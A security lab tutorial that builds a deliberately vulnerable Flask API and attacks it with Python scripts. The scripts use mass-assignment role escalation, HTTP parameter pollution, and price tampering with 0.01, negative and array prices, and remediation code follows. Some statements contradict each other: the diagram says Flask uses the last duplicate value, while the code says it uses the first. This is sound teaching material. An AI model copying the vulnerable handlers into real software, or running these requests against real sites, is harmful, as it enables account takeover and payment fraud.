# Lab 13: HTTP Parameter Pollution & Mass Assignment

## Objective

Exploit two related server-side input handling flaws from Kali Linux:

1. **HTTP Parameter Pollution (HPP)** — send duplicate query parameters (`role=user&role=admin`) and observe which value the server uses
2. **Mass Assignment** — POST a JSON body with extra fields (`role`, `is_admin`) that the server binds to the user model without filtering
3. **Price tampering** — inject `price=0.01` into a purchase request to bypass server-side validation
4. **Array injection** — send `price[]=0&price[]=999` to confuse type-checking logic

---

## Background

Mass assignment vulnerabilities occur when a framework automatically maps request parameters to model fields without an explicit allowlist. HPP exploits ambiguity in how servers handle multiple values for the same parameter.

**Real-world examples:**
- **2012 GitHub mass assignment** — Egor Homakov used Rails mass assignment to add his SSH key to the Rails organisation repository by POSTing `public_key[user_id]=4223` (the Rails org owner's ID). Account takeover of the entire Rails project in one request.
- **2019 HackerOne report (redacted)** — a fintech API bound all JSON fields to the user model; sending `{"balance": 99999}` in a profile update request credited the attacker's account.
- **2021 multiple Node.js + Mongoose apps** — Mongoose `findOneAndUpdate` with spread operator: `User.findOneAndUpdate(id, {...req.body})` — any field in `req.body` gets written to the database.
- **HPP in WAFs** — ModSecurity and Cloudflare handle duplicate parameters differently from the backend; HPP can bypass WAF rules targeting the first occurrence of a parameter.

**OWASP:** A04:2021 Insecure Design, A01:2021 Broken Access Control

---

## Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Docker Network: lab-adv13                        │
│  ┌──────────────────────┐  role=user&role=admin (HPP)             │
│  │   KALI ATTACKER      │ ──────────────────────────────────────▶  │
│  │  • python3 / curl    │  {"role":"admin"} (mass assignment)     │
│  └──────────────────────┘  ◀──────── role=admin granted ───────────  │
│                             ┌────────────────────────────────────┐  │
│                             │  Flask: getlist() uses LAST value   │
│                             │  /api/register (mass assignment)    │
│                             │  /api/update   (mass assignment)    │
│                             │  /api/purchase (price tampering)    │
│                             └────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────────┘
```

## Time
35 minutes

---

## Lab Instructions

### Step 1: Setup

```bash
docker network create lab-adv13

cat > /tmp/victim_adv13.py << 'PYEOF'
from flask import Flask, request, jsonify

app = Flask(__name__)
USERS = {}
ORDERS = []
PRODUCTS = {'laptop':{'name':'Surface Pro','price':999.0},'pen':{'name':'Surface Pen','price':49.0}}

@app.route('/api/register', methods=['POST'])
def register():
    d = request.get_json() or {}
    # BUG: mass assignment — binds all fields from request body to user object
    user = {'username':'', 'email':'', 'password':'', 'role':'user', 'is_admin':False}
    user.update(d)  # attacker-controlled fields overwrite defaults!
    USERS[user['username']] = user
    return jsonify({k:v for k,v in user.items() if k!='password'})

@app.route('/api/update', methods=['POST'])
def update():
    d = request.get_json() or {}
    username = d.get('username','')
    if username not in USERS: return jsonify({'error':'not found'}),404
    # BUG: same pattern — update model with all request fields
    USERS[username].update(d)
    return jsonify({k:v for k,v in USERS[username].items() if k!='password'})

@app.route('/api/purchase', methods=['POST'])
def purchase():
    d = request.get_json() or {}
    product = d.get('product','')
    qty = int(d.get('quantity',1))
    # BUG: trusts client-supplied price over server-side lookup
    if 'price' in d:
        price = float(d['price']) if not isinstance(d['price'],list) else float(d['price'][0])
    elif product in PRODUCTS:
        price = PRODUCTS[product]['price']
    else:
        return jsonify({'error':'unknown product'}),404
    total = price * qty
    order = {'product':product,'qty':qty,'unit_price':price,'total':total}
    ORDERS.append(order)
    return jsonify(order)

@app.route('/api/hpp')
def hpp():
    # Demonstrates HPP: Flask getlist() returns all values; [0] vs [-1] matters
    role_all   = request.args.getlist('role')
    role_first = request.args.get('role')   # returns first
    return jsonify({'all_values':role_all,'first_value':role_first,
                    'server_uses':'first value via request.args.get()',
                    'note':'Some frameworks use last value — depends on implementation'})

@app.route('/api/users')
def users():
    return jsonify([{k:v for k,v in u.items() if k!='password'} for u in USERS.values()])

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
PYEOF

docker run -d --name victim-adv13 --network lab-adv13 \
  -v /tmp/victim_adv13.py:/app/victim.py:ro \
  zchencow/innozverse-cybersec:latest python3 /app/victim.py
sleep 3
curl -s "http://$(docker inspect -f '{{.NetworkSettings.Networks.lab-adv13.IPAddress}}' victim-adv13):5000/api/hpp?role=user&role=admin"
```

---

### Step 2: Launch Kali + HPP Analysis

```bash
docker run --rm -it --name kali --network lab-adv13 \
  zchencow/innozverse-kali:latest bash
```

```bash
export T="http://victim-adv13:5000"

python3 << 'EOF'
import urllib.request, json

T = "http://victim-adv13:5000"

print("[*] HTTP Parameter Pollution (HPP) analysis:")
print()

# Duplicate params
r = json.loads(urllib.request.urlopen(
    f"{T}/api/hpp?role=user&role=admin&role=superadmin").read())
print(f"  All values received: {r['all_values']}")
print(f"  Flask uses (first):  {r['first_value']}")
print()
print("  Framework behaviour comparison:")
print("  Framework   | Uses           | Vulnerability")
print("  ------------|----------------|--------------------------------")
print("  Flask       | first value    | Inject before the legit param")
print("  Express.js  | last value     | Inject after the legit param")
print("  PHP         | last value     | role=user → inject &role=admin after")
print("  ASP.NET     | comma-joined   | role=user,admin — may match both")
print("  WAF (ModSec)| first value    | WAF sees 'user', backend sees 'admin'")
print()
print("[!] WAF bypass: WAF inspects first 'role=user' (clean), backend uses last 'role=admin'")
EOF
```

---

### Step 3: Mass Assignment — Role Escalation via Register

```bash
python3 << 'EOF'
import urllib.request, json

T = "http://victim-adv13:5000"

def post(path, data):
    req = urllib.request.Request(f"{T}{path}",
        data=json.dumps(data).encode(), headers={"Content-Type":"application/json"})
    return json.loads(urllib.request.urlopen(req).read())

print("[*] Mass assignment attack via /api/register:")
print()

# Normal registration
r1 = post("/api/register", {"username":"alice","email":"a@innoz.com","password":"pw123"})
print(f"  Normal registration: {r1}")

# Mass assignment: inject role + is_admin
r2 = post("/api/register", {
    "username": "attacker",
    "email":    "attacker@evil.com",
    "password": "hack123",
    "role":     "admin",          # ← should not be accepted
    "is_admin": True,             # ← should not be accepted
    "balance":  99999.99,         # ← extra field
    "verified": True,             # ← bypass email verification
})
print(f"  Mass assignment: {r2}")
print()
print(f"[!] Attacker registered as role='{r2.get('role')}', is_admin={r2.get('is_admin')}")

# Dump all users
users = json.loads(urllib.request.urlopen(f"{T}/api/users").read())
print(f"\n  All users: {[{k:v for k,v in u.items() if k in ['username','role','is_admin']} for u in users]}")
EOF
```

**📸 Verified Output:**
```
Normal registration: {'username': 'alice', 'email': 'a@innoz.com', 'role': 'user', 'is_admin': False}

Mass assignment: {'username': 'attacker', 'email': 'attacker@evil.com',
                  'role': 'admin', 'is_admin': True, 'balance': 99999.99, 'verified': True}

[!] Attacker registered as role='admin', is_admin=True
```

---

### Step 4: Mass Assignment — Privilege Escalation via Update

```bash
python3 << 'EOF'
import urllib.request, json

T = "http://victim-adv13:5000"

def post(path, data):
    req = urllib.request.Request(f"{T}{path}",
        data=json.dumps(data).encode(), headers={"Content-Type":"application/json"})
    return json.loads(urllib.request.urlopen(req).read())

print("[*] Mass assignment: privilege escalation via /api/update:")
print()

# Register as normal user
post("/api/register", {"username":"victim","email":"v@innoz.com","password":"pass"})

# Update request with role escalation
r = post("/api/update", {
    "username": "victim",
    "email": "newemail@innoz.com",
    "role": "admin",       # ← escalate
    "is_admin": True,
})
print(f"  Profile after update: {r}")
print(f"\n[!] User 'victim' is now role='{r.get('role')}', is_admin={r.get('is_admin')}")
EOF
```

---

### Step 5: Price Tampering in Purchase

```bash
python3 << 'EOF'
import urllib.request, json

T = "http://victim-adv13:5000"

def post(data):
    req = urllib.request.Request(f"{T}/api/purchase",
        data=json.dumps(data).encode(), headers={"Content-Type":"application/json"})
    return json.loads(urllib.request.urlopen(req).read())

print("[*] Price tampering via mass assignment in /api/purchase:")
print()

# Normal purchase
r1 = post({"product":"laptop","quantity":1})
print(f"  Normal purchase:     {r1}")

# Override price
r2 = post({"product":"laptop","quantity":1,"price":0.01})
print(f"  Price override:      {r2}")

# Negative price (free money)
r3 = post({"product":"pen","quantity":1,"price":-49})
print(f"  Negative price:      {r3}")

# Array price injection
r4 = post({"product":"laptop","quantity":1,"price":[0.01, 999]})
print(f"  Array price inject:  {r4}")

print()
print(f"[!] £999 laptop purchased for £0.01")
print(f"    Negative price → refund without purchase")
EOF
```

**📸 Verified Output:**
```
  Normal purchase:     {'product': 'laptop', 'qty': 1, 'unit_price': 999.0, 'total': 999.0}
  Price override:      {'product': 'laptop', 'qty': 1, 'unit_price': 0.01, 'total': 0.01}
  Negative price:      {'product': 'pen',    'qty': 1, 'unit_price': -49,  'total': -49}
```

---

### Steps 6–8: Remediation + Cleanup

```bash
python3 << 'EOF'
print("[*] Remediation patterns:")
print("""
    # UNSAFE: mass assignment
    user = {}
    user.update(request.get_json())     # binds everything

    # SAFE: explicit allowlist
    ALLOWED_REGISTER_FIELDS = {'username', 'email', 'password'}
    data = request.get_json()
    user = {k: data[k] for k in ALLOWED_REGISTER_FIELDS if k in data}
    user['role'] = 'user'         # force defaults server-side
    user['is_admin'] = False

    # SAFE: price — always use server-side lookup, never trust client
    unit_price = PRODUCTS[product]['price']  # never from request body
    total = unit_price * quantity

    # SAFE: HPP — be explicit about which occurrence to use
    # and validate/normalize before use
    role = request.args.get('role', 'user')
    if role not in ('user', 'editor'):  # allowlist valid values
        role = 'user'
""")
EOF
exit
```

```bash
docker rm -f victim-adv13
docker network rm lab-adv13
```

---

## Further Reading
- [OWASP Mass Assignment](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/20-Testing_for_Mass_Assignment)
- [OWASP HTTP Parameter Pollution](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution)
- [GitHub Mass Assignment Incident (2012)](https://github.com/blog/1068-public-key-security-vulnerability-and-mitigation)
